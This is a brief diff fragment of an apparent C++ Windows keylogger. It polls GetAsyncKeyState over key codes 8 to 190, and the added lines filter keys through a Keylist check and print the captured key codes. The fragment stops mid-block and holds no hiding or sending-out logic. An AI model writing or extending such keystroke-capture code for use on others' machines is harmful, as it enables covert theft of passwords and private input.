@@ -49,3 +49,5 @@ int main(){
         Sleep(10);
 		for (key=8; key<=190; key++){
             if (GetAsyncKeyState(key) == -32767){
+			if(Keylist(key) == FALSE){
+                    cout << key;
